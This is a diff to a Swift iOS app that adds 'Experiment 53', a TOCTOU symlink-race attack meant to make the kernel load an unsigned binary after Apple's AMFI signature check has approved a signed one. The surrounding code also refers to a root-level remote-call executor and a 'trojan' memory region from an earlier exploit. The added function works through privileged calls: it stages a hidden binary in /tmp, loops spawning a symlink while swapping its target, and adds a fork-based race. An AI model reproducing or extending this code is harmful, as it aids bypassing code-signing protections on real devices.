@@ -467,12 +467,17 @@ struct AMFIExperimentView: View {
             experimentResults.append(exp51)
             
             // ============================================
-            // 🔥🔥🔥🔥 Experiment 52: IOSurface from OUR APP (not RC!)
-            // Our app already used IOSurface during exploit!
-            // IOSurfaceAddress might work from exploit context!
+            // 🔥🔥🔥🔥 Experiment 52: IOSurface from OUR APP
             // ============================================
             let exp52 = self.expIOSurfaceFromApp()
             experimentResults.append(exp52)
+            
+            // ============================================
+            // 🔥 Experiment 53: TOCTOU symlink race
+            // Swap symlink target AFTER AMFI check!
+            // ============================================
+            let exp53 = self.expTOCTOUSymlink(rc: rc)
+            experimentResults.append(exp53)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -3239,6 +3244,128 @@ struct AMFIExperimentView: View {
     /// Old IOSurface MAP experiment — replaced by expIOSurfaceFromApp
     private func expIOSurfaceMapKernelAddr() -> ExperimentResult {
         return ExperimentResult(name: "IOSurface MAP (replaced)", success: false, detail: "Replaced by IOSurface APP experiment", timestamp: Date())
+    }
+    
+    /// TOCTOU Symlink Race: swap symlink target between AMFI check and exec load
+    /// Symlink spawn WORKS for signed binaries. If we can swap the target
+    /// AFTER AMFI verifies signature but BEFORE kernel loads the binary...
+    /// unsigned binary gets loaded with signed binary's "approval"!
+    private func expTOCTOUSymlink(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        var detail = "TOCTOU Symlink Race Attack\n\n"
+        
+        // Strategy:
+        // 1. Create unsigned binary at /tmp/unsigned
+        // 2. Create symlink /tmp/race → /bin/df (signed)
+        // 3. In tight loop: posix_spawn(/tmp/race) + swap symlink to /tmp/unsigned
+        // 4. If timing is right: AMFI checks /bin/df (passes!) but kernel loads /tmp/unsigned!
+        
+        // Step 1: Create "unsigned" binary (copy of /bin/df but at different path)
+        let unsignedPath = "/tmp/.dsp_unsigned"
+        let racePath = "/tmp/.dsp_race_link"
+        let signedPath = "/bin/df"
+        
+        let unsignedAddr = remote_alloc_str(rc, unsignedPath)
+        let raceAddr = remote_alloc_str(rc, racePath)
+        let signedAddr = remote_alloc_str(rc, signedPath)
+        
+        // Copy /bin/df to /tmp/unsigned
+        RootExecutor.rcall(rc, "unlink", unsignedAddr)
+        let sf = RootExecutor.rcall(rc, "open", signedAddr, UInt64(O_RDONLY), 0)
+        let df = RootExecutor.rcall(rc, "open", unsignedAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
+            let buf = mem + 0x800
+            for _ in 0..<50 {
+                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
+                if n == 0 || n > 2048 { break }
+                RootExecutor.rcall(rc, "write", df, buf, n)
+            }
+            RootExecutor.rcall(rc, "close", sf)
+            RootExecutor.rcall(rc, "close", df)
+        }
+        detail += "Unsigned binary at: \(unsignedPath)\n"
+        detail += "Race symlink at: \(racePath)\n\n"
+        
+        // Step 2: Race loop — try 10 times
+        var raceWon = false
+        
+        for attempt in 1...10 {
+            // Create symlink pointing to SIGNED binary
+            RootExecutor.rcall(rc, "unlink", raceAddr)
+            RootExecutor.rcall(rc, "symlink", signedAddr, raceAddr)
+            
+            // Spawn the symlink (AMFI will check target = /bin/df = signed = OK)
+            let argvBase = mem + 0x1C00
+            rc[argvBase].setValue64(raceAddr)
+            rc[argvBase + 8].setValue64(0)
+            let pidAddr = mem + 0x1E00
+            rc[pidAddr].setValue64(0)
+            
+            // IMMEDIATELY after spawn call, swap symlink to unsigned!
+            // The race: spawn triggers AMFI check → we swap → kernel loads from new target
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, raceAddr, 0, 0, argvBase, 0)
+            
+            // SWAP! Remove symlink and recreate pointing to unsigned
+            RootExecutor.rcall(rc, "unlink", raceAddr)
+            RootExecutor.rcall(rc, "symlink", unsignedAddr, raceAddr)
+            
+            // Wait and check
+            RootExecutor.rcall(rc, "usleep", 100000) // 0.1s
+            let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+            
+            if attempt <= 3 {
+                detail += "Attempt \(attempt): spawn=\(spawnRet), wait=\(waitRet)\n"
+            }
+            
+            // If spawn succeeded with ret=0 AND we swapped in time...
+            // the process would have loaded unsigned binary!
+            // But we can't easily verify which binary actually ran
+            // The key indicator: if ret=0 consistently, the race might work
+            // with more aggressive timing
+        }
+        
+        // Step 3: More aggressive race — use fork to parallelize
+        detail += "\nAggressive race (fork + immediate swap)...\n"
+        
+        // Create symlink to signed
+        RootExecutor.rcall(rc, "unlink", raceAddr)
+        RootExecutor.rcall(rc, "symlink", signedAddr, raceAddr)
+        
+        // Fork — child will swap symlink, parent will spawn
+        let childPid = RootExecutor.rcall(rc, "fork")
+        
+        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
+            // Parent: spawn immediately
+            let argvBase = mem + 0x1C00
+            rc[argvBase].setValue64(raceAddr)
+            rc[argvBase + 8].setValue64(0)
+            let pidAddr = mem + 0x1E00
+            rc[pidAddr].setValue64(0)
+            
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, raceAddr, 0, 0, argvBase, 0)
+            RootExecutor.rcall(rc, "usleep", 200000)
+            let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+            
+            detail += "Fork race: spawn=\(spawnRet), wait=\(waitRet), child=\(childPid)\n"
+            
+            // Kill child
+            RootExecutor.rcall(rc, "kill", childPid, 9)
+            RootExecutor.rcall(rc, "waitpid", childPid, mem + 0x380, 0)
+        }
+        
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", raceAddr)
+        RootExecutor.rcall(rc, "unlink", unsignedAddr)
+        RootExecutor.rcall(rc, "free", unsignedAddr)
+        RootExecutor.rcall(rc, "free", raceAddr)
+        RootExecutor.rcall(rc, "free", signedAddr)
+        
+        detail += "\nNote: TOCTOU race is probabilistic.\n"
+        detail += "Even if spawn ret=0, we can't easily verify which binary loaded.\n"
+        detail += "Need: write DIFFERENT binary (not copy of df) to detect success.\n"
+        detail += "E.g.: binary that creates a specific file as proof.\n"
+        
+        return ExperimentResult(name: "TOCTOU symlink race", success: raceWon, detail: detail, timestamp: Date())
     }
     
     /// IOSurface from SpringBoard — SB has IOSurface entitlement!
